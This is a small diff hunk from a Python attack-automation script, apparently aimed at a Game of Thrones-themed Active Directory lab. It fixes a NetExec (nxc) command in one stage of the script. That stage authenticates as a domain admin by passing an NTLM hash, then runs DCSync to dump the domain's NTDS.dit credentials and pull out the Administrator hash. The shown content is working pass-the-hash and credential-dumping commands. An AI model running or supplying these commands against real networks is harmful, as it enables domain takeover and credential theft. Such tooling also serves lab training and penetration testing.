@@ -183,7 +183,7 @@ log(f"{Fore.CYAN}👑 Authenticating as Domain Admin: cersei.lannister{Style.RES
 log(f"{Fore.CYAN}🎯 Objective: Extract entire AD database (NTDS.dit){Style.RESET_ALL}\n")
 run_command(f"nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}'")
 log(f"\n{Fore.CYAN}💾 Executing DCSync to dump all domain credentials...{Style.RESET_ALL}\n")
-dcsync_output = run_command(f"yes | nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}' --ntds Administrator")
+dcsync_output = run_command(f"yes | nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}' --ntds --user Administrator")
 
 # Extract "Administrator:500:<hash>:<hash>:::"
 log(f"\n{Fore.CYAN}🔍 Parsing DCSync output for Administrator hash...{Style.RESET_ALL}")
